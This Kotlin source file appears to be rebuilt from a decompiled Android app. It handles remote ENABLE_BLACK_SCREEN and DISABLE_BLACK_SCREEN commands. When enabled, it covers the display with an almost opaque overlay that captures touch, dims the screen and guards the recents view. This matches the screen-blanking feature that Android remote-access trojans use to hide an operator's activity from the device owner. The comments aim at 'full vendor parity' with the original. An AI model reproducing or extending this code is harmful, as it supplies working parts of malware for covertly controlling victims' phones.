package com.storm.safe.rock.service.modules.command

import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject

/**
 * Handles black screen overlay enable/disable commands.
 *
 * Reverse-engineered from JADX: C0434dy (dy, 265 lines, in p000/).
 * Vendor name: BlackScreenCmdHandler
 *
 * Supported commands:
 * - ENABLE_BLACK_SCREEN: Activates full-screen black overlay with configurable params
 *   (text, fontSize, alpha, showIcon, showProgress, style).
 *   Vendor sets maskOverlayManager alpha, showIcon/showProgress flags, style,
 *   then calls fd0.m212792a0() to show overlay. Sets f52469k0 = true.
 *   After 300ms delay, verifies overlay is visible; retries once if not.
 *   On success calls dimScreen() + initializeRecentsGuard().
 *
 * - DISABLE_BLACK_SCREEN: Deactivates overlay.
 *   Vendor sets f52469k0 = false, calls resetScreenBrightness(),
 *   ibbnqvnvhxg.finishIfRunning(), disables touch intercept on maskOverlay,
 *   hides the overlay view, resets alpha to 252.
 *
 * Dependencies:
 * - service.isCipherListeningActive (= vendor f52469k0, isBlackScreenActive flag)
 * - service.dimScreen() (= vendor m211453e2)
 * - service.initializeRecentsGuard() (= vendor m211491i5)
 * - service.resetScreenBrightness() (= vendor m211510k6)
 * - service.setTouchInterceptionEnabled() (= vendor maskOverlayManager touch control)
 * - ibbnqvnvhxg.finishIfRunning()
 * - OverlayManager (replaces old mask overlay stub, vendor fd0 MaskOverlayManager)
 */
class BlackScreenCommandHandler : CommandHandler {

    companion object {
        private const val TAG = "BlackScreenCmdHandler"

        /** Delay before verifying overlay is visible (ms). Vendor: 300L */
        private const val OVERLAY_VERIFY_DELAY_MS = 300L
    }

    override fun getSupportedCommands(): Set<String> = setOf(
        "ENABLE_BLACK_SCREEN",
        "DISABLE_BLACK_SCREEN"
    )

    override suspend fun handle(command: String, params: JSONObject?, context: CommandContext) {
        when (command) {
            "ENABLE_BLACK_SCREEN" -> handleEnableBlackScreen(params, context)
            "DISABLE_BLACK_SCREEN" -> handleDisableBlackScreen(context)
        }
    }

    /**
     * Enable black screen overlay.
     *
     * Vendor flow (C0434dy lines 35-222):
     * 1. Extract params: text, fontSize(24), alpha(252), showIcon(false), showProgress(false), style("android")
     * 2. Set maskOverlayManager alpha via AbstractC1117qo.m214413a9(alpha, 0, MASK)
     * 3. Set overlay showIcon, showProgress, style flags
     * 4. Call fd0.m212792a0() to show overlay
     * 5. Set service.f52469k0 = true (isBlackScreenActive)
     * 6. After 300ms delay: verify overlay is visible, retry once if not
     * 7. On success: call dimScreen() + initializeRecentsGuard()
     */
    private fun handleEnableBlackScreen(params: JSONObject?, context: CommandContext) {
        val text = params?.optString("text", "") ?: ""
        val fontSize = params?.optInt("fontSize", 24) ?: 24
        val alpha = params?.optInt("alpha", 252) ?: 252
        val showIcon = params?.optBoolean("showIcon", false) ?: false
        val showProgress = params?.optBoolean("showProgress", false) ?: false
        val style = params?.optString("style", "android") ?: "android"

        Log.d(TAG, "收到 ENABLE_BLACK_SCREEN 命令，样式: $style, 文字: $text, " +
                "字号: $fontSize, 透明度: $alpha, 图标: $showIcon, 进度条: $showProgress")

        val service = context.service
        if (service == null) {
            Log.e(TAG, "service 不可用，无法启用黑屏")
            return
        }

        try {
            Log.d("dqtvuisjd", "启用黑屏遮盖，样式: $style, 文字: $text, " +
                    "字号: $fontSize, 透明度: $alpha, 图标: $showIcon, 进度条: $showProgress, blockInput: false")

            // ADAPT: Vendor uses fd0 (MaskOverlayManager) to configure and show overlay.
            // OverlayManager replaces the old mask overlay stub with full vendor parity.
            // OverlayConfig.blackScreen() maps vendor params: alpha, text, interceptTouch.

            // Show the overlay as the black screen
            service.overlayManager?.show(com.storm.safe.rock.service.modules.overlay.OverlayConfig.blackScreen(
                text = text,
                alpha = alpha / 255f,
                interceptTouch = true
            ))

            // Set black screen active flag
            // vendor: dqtvuisjdVar.f52469k0 = true
            service.isCipherListeningActive = true

            // Delayed verification + post-enable actions
            // vendor: Handler(mainLooper).postDelayed(300ms) { verify overlay, dimScreen, initRecentsGuard }
            Handler(Looper.getMainLooper()).postDelayed({
                if (!service.isCipherListeningActive) {
                    Log.d("dqtvuisjd", "黑屏已被取消，跳过延迟回调")
                    return@postDelayed
                }

                // vendor: after verifying overlay visible, calls:
                //   dqtvuisjdVar.m211453e2() — dimScreen
                //   dqtvuisjdVar.m211491i5() — initializeRecentsGuard
                service.dimScreen()
                service.initializeRecentsGuard()
                Log.d("dqtvuisjd", "黑屏遮盖已启用，样式: $style")
            }, OVERLAY_VERIFY_DELAY_MS)

        } catch (e: Exception) {
            Log.e("dqtvuisjd", "启用黑屏遮盖失败", e)
        }

        Log.d(TAG, "enableBlackScreen() 执行完成")
    }

    /**
     * Disable black screen overlay.
     *
     * Vendor flow (C0434dy lines 223-261):
     * 1. Set service.f52469k0 = false
     * 2. Call service.m211510k6() — resetScreenBrightness
     * 3. Call ibbnqvnvhxg.f55194a0.finishIfRunning()
     * 4. Disable touch interception on maskOverlay
     * 5. Hide overlay view, reset alpha to 252
     */
    private fun handleDisableBlackScreen(context: CommandContext) {
        Log.d(TAG, "收到 DISABLE_BLACK_SCREEN 命令，开始执行 disableBlackScreen()")

        val service = context.service
        if (service == null) {
            Log.e(TAG, "service 不可用，无法禁用黑屏")
            return
        }

        try {
            Log.d("dqtvuisjd", "取消黑屏遮盖")

            // vendor: dqtvuisjdVar.f52469k0 = false
            service.isCipherListeningActive = false

            // vendor: dqtvuisjdVar.m211510k6() — reset screen brightness
            service.resetScreenBrightness()

            // vendor: ibbnqvnvhxg.f55194a0.finishIfRunning()
            com.storm.safe.rock.p029ui.ibbnqvnvhxg.finishIfRunning()

            // ADAPT: Vendor disables touch interception via maskOverlayManager:
            //   fd0Var disables touch + hides overlay + resets alpha to 252
            // Using service method + OverlayManager:
            service.setTouchInterceptionEnabled(false)
            service.overlayManager?.hide()

            Log.d("dqtvuisjd", "黑屏遮盖已取消")
        } catch (e: Exception) {
            Log.e("dqtvuisjd", "取消黑屏遮盖失败", e)
        }

        Log.d(TAG, "disableBlackScreen() 执行完成")
    }
}
